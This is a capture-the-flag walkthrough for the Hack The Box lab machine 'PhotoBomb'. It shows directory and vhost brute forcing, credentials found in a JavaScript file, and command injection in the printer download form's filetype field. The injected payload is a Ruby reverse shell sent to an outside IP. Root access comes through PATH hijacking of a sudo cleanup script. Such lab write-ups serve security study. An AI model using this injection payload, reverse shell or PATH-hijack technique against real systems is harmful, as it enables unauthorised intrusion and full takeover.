# PhotoBomb

***
### Domain name
***

Photobomb uses a domain name of ````photobomb.htb````.

open /etc/hosts and add

```
ip_address  photobomb.htb
```

***
### Directory Bruteforce
***

Command: ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -u http://photobomb.htb/FUZZ

```
printer                 [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 182ms]
printers                [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 388ms]
printerfriendly         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 176ms]
printer_friendly        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 145ms]
printer_icon            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 687ms]
printer-icon            [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 438ms]
printer-friendly        [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 442ms]
printerFriendly         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 689ms]
printersupplies         [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 414ms]
printer1                [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 487ms]
                        [Status: 200, Size: 843, Words: 136, Lines: 23, Duration: 312ms]
printer2                [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 559ms]
printericon             [Status: 401, Size: 188, Words: 6, Lines: 8, Duration: 490ms]
```

***
### Current plan of attack
***
We currently know that this server is a server for a new startup that is aiming to print photographs for other people. they are using Sinatra to run their web site and have a simple HTTP login form.

* Method 1
    * Hack the web application it self which is Sinatra

* Method 2
    * Brute force login

* Method 3
    * Do a subdomain brute force attack

* Best Idea
    * Start with Method 3 then Method 2 and final Method 3.
***


### Method 3

***
Command:  

```gobuster vhost -u http://photobomb.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 100```  

After I ran this command I found not subdomains so I decided to hit it with a bigger list of subdomains.
```New word list: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt```

Then I used an even bigger list
```Final word list: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt```  


***

### Checked HTB Form

***
Looked in the .js file and for a link to follow

http://pH0t0:b0Mb!@photobomb.htb/printer

Username: pH0t0
Password: b0Mb

***

### Checked Form and Found How To Getting RCE
***
This machine is vulnerable to remote code execution. If you open up burp suite and click on the download button, and you will see the request with three pieces of data. The first piece of data contains then the name of the file to download. This input is checked to make sure no LFI injections will get through by using some regex that cause the page to error out if .. or / is used in the field. The second input is a regex filter input that check that the input is  either PNG or JPG. If the input is not either of those, then it tells the fount end that there is an invalid file type. This field however is still vulnerable. If you place a ; right after the proper file type, every thing after is not checked but executed by the ruby framework. The trick is simply placing a ruby reverse shell from https://www.revshells.com/ and forwarding the request.

Burp Request
```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 79
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Cookie: isPhotoBombTechSupport=46456
Upgrade-Insecure-Requests: 1

photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg; ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.112",4446))'&dimensions=3000x2000
```
To get the flag simple cat user.txt

```
wizard@photobomb:~/photobomb$ cat /home/wizard/user.txt
cat /home/wizard/user.txt
4779f13046e97ddea9d8efa0f814e8e2

```

***
### Privilege Escalation
***
Once you have the user flag it is time to head for the root flag. The first thing to do is run the sudo -l command to see the sudo permissions for the current user.
```
wizard@photobomb:~/photobomb$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
We can see from this command that the wizard user can run the /opt/cleanup.sh command as root to clean up his files. Lets look at the contains of this file to see if we can take advantage  of this configuration.

Content of cleanup.sh

```
root@photobomb:~# cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
```

This file contains references to other files which introduces the ability to change the $PATH to access custom files.


export
```
echo bash > find
chmod +x find

sudo PATH=$PWD:$PATH /opt/cleanup.sh
```

Now all you have to do is get the root flag.

```
root@photobomb:~# cat /root/root.txt
b92895d46baebe10a0994cb2f0a94864
```
